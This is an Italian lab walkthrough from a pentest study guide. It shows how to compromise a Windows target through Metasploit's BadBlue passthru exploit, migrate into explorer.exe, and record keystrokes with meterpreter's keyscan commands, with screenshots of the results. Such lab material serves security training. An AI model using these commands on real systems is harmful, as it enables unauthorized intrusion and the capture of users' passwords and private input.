# Keylogging

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In questo laboratorio abbiamo accesso sia alla macchina Attacker che Target.

## Accesso alla macchina target

```
service postresql start && msfconsole
workspace -a Keylogging
use exploit/windows/http/badblue_passthru
//settiamo RHOSTS e target
run
sysinfo
getuid
pgrep explorer.exe //il keylogging di MSF non funziona bene se non è sul processo explorer
migrate 2312
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Abilitare il keylogging con MSF

```
help
keyscan_start //avvia il keylogging
keyscan_dump //mostra il log dei tasti sniffati: <Shift> è il maiuscolo, <^H> è backspace, ecc...
//se dovessimo avere problemi nel dump possiamo riavviare il servizio:
keyscan_stop
keyscan_start
keyscan_dump
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

keyboard\_send e keyevent sono ridondanti se abbiamo già accesso al target via meterpreter, i comandi li possiamo inviare direttamente da qui.

Sul nostro target nel frattempo apriamo notepad in modo da poter fare dei test:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se dovessimo riscontrare dei problemi nello sniffing come nel caso sopra, possiamo riavviare keyscan.

<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
